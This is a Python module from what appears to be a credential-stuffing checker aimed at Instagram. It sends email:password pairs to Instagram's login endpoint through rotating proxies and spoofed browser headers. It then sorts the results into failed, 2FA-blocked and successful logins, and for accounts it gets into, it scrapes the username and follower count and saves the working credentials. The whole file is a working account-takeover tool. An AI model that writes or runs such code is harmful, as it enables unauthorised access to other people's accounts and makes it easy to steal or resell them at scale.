from modules.variables import Checker
from requests import Session,get
from modules.functions import bad_proxy, log, return_proxy,save,set_proxy
from requests.adapters import HTTPAdapter, Retry
import functools

def check(email:str,password:str):
    while not Checker.stopping:
        try:
            proxy = set_proxy()
            proxy_set = set_proxy(proxy)
            
            with Session() as s:
                s.request = functools.partial(s.request, timeout=Checker.timeout)
                s.proxies.update(proxy_set)
                retries = Retry(total=Checker.retries, backoff_factor=0.1)
                s.mount('http://', HTTPAdapter(max_retries=retries))
                s.mount('https://', HTTPAdapter(max_retries=retries))

                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" ,
                    "Content-Type": "application/x-www-form-urlencoded" ,
                    "Accept-Language": "en-US,en;q=0.9" ,
                    "X-Requested-With": "XMLHttpRequest" ,
                    "Accept": "*/*" ,
                    "Referer": "https://www.instagram.com/" ,
                    "X-IG-App-ID": "936619743392459" ,
                    "X-IG-WWW-Claim": "0" ,
                    "X-Instagram-AJAX": "c1dcf20d99d7" ,
                    "Sec-Fetch-Dest": "empty" ,
                    "Sec-Fetch-Mode": "cors" ,
                    "Sec-Fetch-Site": "same-origin" ,
                    "X-CSRFToken": "missing" ,
                    "Host": "www.instagram.com" ,
                    "Connection": "Keep-Alive" ,
                }
                data = f"username={email}&enc_password=%23PWD_INSTAGRAM_BROWSER%3a0%3a1628896342%3a{password}" 

                response = s.post("https://www.instagram.com/accounts/login/ajax/",data=data,headers=headers)
                if "\"authenticated\":false" in response.text or "\"user\":false" in response.text:
                    Checker.bad += 1
                    return_proxy(proxy)
                elif "\"two_factor_required\":true" in response.text or "\"checkpoint_required\"" in response.text:
                    Checker.custom += 1
                    return_proxy(proxy)
                    if not Checker.cui: log("custom",":".join([email,password]),"Instagram")
                    save("Instagram","custom",Checker.time,":".join([email,password])+' | 2FA')
                    return
                elif "\"authenticated\":true" not in response.text:
                    raise

                username = s.get("https://www.instagram.com/accounts/edit/").text.split(r"\"username\":\"")[1].split(r"\",\"")[0]
                followers = s.get(f"https://www.instagram.com/{username}/").text.split('" name="description"')[0].split('<meta content="')[1].split(' Followers')[0]
                
                Checker.good += 1
                return_proxy(proxy)
                if not Checker.cui: log("good",":".join([email,password]),"Instagram")
                save("Instagram","good",Checker.time,":".join([email,password])+f" | Username: {username} | Followers: {followers}")
                return
        except:
            bad_proxy(proxy)
            return_proxy(proxy)
            Checker.errors += 1

        